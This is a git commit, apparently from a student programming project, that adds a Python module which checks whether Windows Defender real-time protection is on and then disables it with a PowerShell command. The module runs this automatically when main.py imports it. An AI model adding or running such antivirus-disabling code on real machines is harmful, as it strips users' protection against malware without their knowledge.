b0dc3a92c8a67857d30c059ea9dad5a7f100a6b6
Paul Penning <paul.penning@hva.nl>
2024-02-07 18:07:48 +0100

    Defender toegevoegd
    Laatste paar regels verwijderen bij testen

---
+++ defender.py
@@ -0,0 +1,36 @@
+import subprocess
+import time
+
+def check_antivirus_status():
+    # het commando om de Antivirus status op te halen
+    powershell_command = r"Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled"
+
+    # Voer het PowerShell-commando uit
+    result = subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
+
+    
+    if result.returncode == 0:
+        antivirus_enabled = result.stdout.strip()
+        if antivirus_enabled.lower() == 'true':
+            print("Antivirus is ingeschakeld.")
+        elif antivirus_enabled.lower() == 'false':
+            print("Antivirus is uitgeschakeld.")
+        else:
+            print("Kan antivirusstatus niet bepalen.")
+    else:
+        print("Fout bij het uitvoeren van het PowerShell-commando.")
+
+def turn_antivirus_off():
+    # het commando om de Anti virus uit te zetten.
+    powershell_command = r"Set-MpPreference -DisableRealtimeMonitoring $true"
+
+    try:
+        subprocess.run(["powershell", "-command", powershell_command])
+    except:
+        print("Fout bij het uitvoeren van het PowerShell-commando.")
+
+
+check_antivirus_status()
+turn_antivirus_off()
+time.sleep(5)
+check_antivirus_status()
---
+++ main.py
@@ -0,0 +1,4 @@
+# Dit is het hoofd bestand van het eindproduct van Blok 3 Programming
+# Autheurs: Joris van Selm, Paul Penning
+
+import defender
